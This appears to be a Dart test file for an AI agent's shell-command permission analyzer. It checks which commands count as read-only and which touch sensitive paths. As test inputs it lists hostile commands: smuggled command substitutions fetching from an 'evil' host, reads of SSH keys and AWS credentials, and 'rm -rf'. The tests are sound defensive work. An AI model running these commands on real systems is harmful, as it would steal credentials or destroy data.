import 'package:athena_core/agent/permission/command_analyzer.dart';
import 'package:test/test.dart';

void main() {
  group('CommandAnalyzer.extractAction', () {
    test('extracts first word as action', () {
      expect(CommandAnalyzer.extractAction('git status'), 'git');
      expect(CommandAnalyzer.extractAction('ls -la'), 'ls');
      expect(CommandAnalyzer.extractAction('npm install foo'), 'npm');
      expect(CommandAnalyzer.extractAction('  dart  analyze  '), 'dart');
    });

    test('returns null for empty or composite commands', () {
      expect(CommandAnalyzer.extractAction(''), isNull);
      expect(CommandAnalyzer.extractAction('   '), isNull);
      // 管道 / 分隔符 → 降级
      expect(CommandAnalyzer.extractAction('ls | head'), isNull);
      expect(CommandAnalyzer.extractAction('cd a && npm i'), isNull);
      expect(CommandAnalyzer.extractAction('git status; git log'), isNull);
    });
  });

  group('CommandAnalyzer.isReadOnlyCommand', () {
    test('read-only whitelist commands', () {
      for (final cmd in [
        'ls',
        'ls -la',
        'cat README.md',
        'grep -rn "foo" lib/',
        'head -20 file.txt',
        'tail -f app.log',
        'pwd',
        'which dart',
        'whoami',
        'git status',
        'git status -s',
        'git log --oneline',
        'git diff',
        'npm list',
        'npm list --depth=0',
        'find . -name "*.dart"',
        'cd',
        'cd /Users/x/proj',
        'cd ..',
      ]) {
        expect(
          CommandAnalyzer.isReadOnlyCommand(cmd),
          isTrue,
          reason: 'expected read-only: $cmd',
        );
      }
    });

    test('side-effect commands are not read-only', () {
      for (final cmd in [
        'git push',
        'git commit -m "x"',
        'git checkout main',
        'npm install',
        'npm run build',
        'rm file.txt',
        'rm -rf dir',
        'mkdir -p /tmp/x',
        'mv a b',
        'touch file',
        'curl https://example.com -o out.html',
        'find . -delete',
        'find . -exec rm {} \\;',
        'ls -la > out.txt',
        'cat file >> log',
        'git status && git push',
        'ls | tee out.txt',
      ]) {
        expect(
          CommandAnalyzer.isReadOnlyCommand(cmd),
          isFalse,
          reason: 'expected side-effect: $cmd',
        );
      }
    });

    test('filter pipelines of read-only commands are allowed', () {
      // 纯滤波器链(管道右侧为滤波器且左侧只读)默认放行;
      // 含危险段的链(rm/tee/重定向)仍弹窗 —— 由拆段逐段判定保证
      for (final cmd in [
        'ls -la | head -100',
        'grep -rn --include=*.dart "foo" lib | head -100',
        'git log --oneline -5 | head',
        'ls | grep foo | head',
        'cd /a && git status',
        'git status && git log',
        'cat a.txt && echo done',
        r"awk '{print $1}' file | sort",
        r"find . -name '*.dart' | head",
      ]) {
        expect(
          CommandAnalyzer.isReadOnlyCommand(cmd),
          isTrue,
          reason: 'expected read-only pipeline: $cmd',
        );
      }
    });

    test('extended whitelist: dart / flutter / git / sed / awk', () {
      for (final cmd in [
        'dart test test/agent/permission/',
        'dart analyze',
        'flutter test',
        'flutter analyze',
        'git show HEAD',
        'git -C /Users/x/proj status --short',
        'git --no-pager diff --stat',
        'git branch',
        'git branch --show-current',
        'git branch -v',
        'git branch --list "feature*"',
        'git tag',
        'git tag -n',
        'git tag -l "v*"',
        'git remote -v',
        'git remote show origin',
        'git stash list',
        'git stash show -p',
        "sed -n '1,30p' lib/x.dart",
        'sed -n 1,30p lib/x.dart',
        r"sed 's/\(a\)/\1/g' file",
        "awk '{print \$1}' file",
        "awk -F, '{print \$2}' f.csv",
        r"awk '/^  }$/{print}' file",
      ]) {
        expect(
          CommandAnalyzer.isReadOnlyCommand(cmd),
          isTrue,
          reason: 'expected read-only: $cmd',
        );
      }
    });

    test('extended whitelist rejects write forms', () {
      for (final cmd in [
        'dart run bin/main.dart',
        'dart format lib/',
        'flutter pub get',
        'flutter run -d macos',
        'flutter build macos',
        'flutter pub upgrade',
        'git branch -D feature',
        'git branch fix/bug',
        'git branch -m main2',
        'git tag v1.0',
        'git tag -d v1',
        'git tag -a v1 -m "msg"',
        'git remote add origin git@x.com:y/z.git',
        'git remote set-url origin x',
        'git stash pop',
        "sed -i '' 's/a/b/' file",
        "sed -i.bak 's/a/b/' file",
        "sed 's/a/b/' file > out.txt",
        "awk 'BEGIN{system(\"rm -rf /tmp/x\")}' file",
        "awk '{print \$1 > \"out\"}' file",
        "awk '{print \$1 | \"sort\"}' file",
      ]) {
        expect(
          CommandAnalyzer.isReadOnlyCommand(cmd),
          isFalse,
          reason: 'expected side-effect: $cmd',
        );
      }
    });

    test('command substitution / expansion is never read-only', () {
      // $() 与反引号内的任意命令会在 shell 中先执行,只读判定必须拒绝
      for (final cmd in [
        r'echo $(git push --force)',
        r'echo $(rm -rf /tmp/x)',
        r'ls $(npm install -g evil)',
        r'git log --format=$(curl -o /tmp/x http://evil/x)',
        r'echo `rm -f /tmp/x`',
        r'echo $PATH',
        r'echo ${PATH}',
        r'cat $(ls ~/.ssh)',
      ]) {
        expect(
          CommandAnalyzer.isReadOnlyCommand(cmd),
          isFalse,
          reason: 'expected not read-only: $cmd',
        );
      }
    });

    test('sensitive paths are never read-only even in whitelist', () {
      for (final cmd in [
        'cat ~/.ssh/id_rsa',
        'cat ~/.ssh/authorized_keys',
        'cat ~/.aws/credentials',
        'cat /home/u/proj/.env',
        'cat .env.local',
        'grep secret ~/.athena/permissions.json',
        'ls ~/.aws/',
        'cd ~/.ssh/',
      ]) {
        expect(
          CommandAnalyzer.isReadOnlyCommand(cmd),
          isFalse,
          reason: 'expected not read-only (sensitive): $cmd',
        );
      }
    });

    test('containsSensitivePath detects credential paths', () {
      expect(CommandAnalyzer.containsSensitivePath('cat ~/.ssh/id_rsa'),
          isTrue);
      expect(CommandAnalyzer.containsSensitivePath('cat ~/.aws/credentials'),
          isTrue);
      expect(CommandAnalyzer.containsSensitivePath('cat README.md'), isFalse);
      expect(CommandAnalyzer.containsSensitivePath('ls lib/src'), isFalse);
    });
  });

  group('CommandAnalyzer.splitSubcommands', () {
    test('splits on shell operators', () {
      expect(CommandAnalyzer.splitSubcommands('git status && npm test'),
          ['git status', 'npm test']);
      expect(CommandAnalyzer.splitSubcommands('ls | grep foo'),
          ['ls', 'grep foo']);
      expect(CommandAnalyzer.splitSubcommands('a; b; c'), ['a', 'b', 'c']);
      expect(CommandAnalyzer.splitSubcommands('a || b'), ['a', 'b']);
      expect(CommandAnalyzer.splitSubcommands('a |& b'), ['a', 'b']);
      expect(CommandAnalyzer.splitSubcommands('a & b'), ['a', 'b']);
      expect(CommandAnalyzer.splitSubcommands('a\nb'), ['a', 'b']);
    });

    test('keeps quoted operators intact', () {
      expect(CommandAnalyzer.splitSubcommands(r'grep -n "a | b" file'),
          [r'grep -n "a | b" file']);
      expect(CommandAnalyzer.splitSubcommands(r"grep 'x && y' f"),
          [r"grep 'x && y' f"]);
      expect(CommandAnalyzer.splitSubcommands(r'echo "a \" ; b"'),
          [r'echo "a \" ; b"']);
    });

    test('keeps command substitution and subshell intact', () {
      expect(CommandAnalyzer.splitSubcommands(r'echo $(git push || true)'),
          [r'echo $(git push || true)']);
      expect(CommandAnalyzer.splitSubcommands('(a; b) && c'),
          ['(a; b)', 'c']);
    });

    test('unbalanced paren falls back to single part', () {
      expect(CommandAnalyzer.splitSubcommands(r'echo $(foo'),
          [r'echo $(foo']);
    });

    test('empty input yields no parts', () {
      expect(CommandAnalyzer.splitSubcommands(''), isEmpty);
      expect(CommandAnalyzer.splitSubcommands('   '), isEmpty);
    });
  });
}
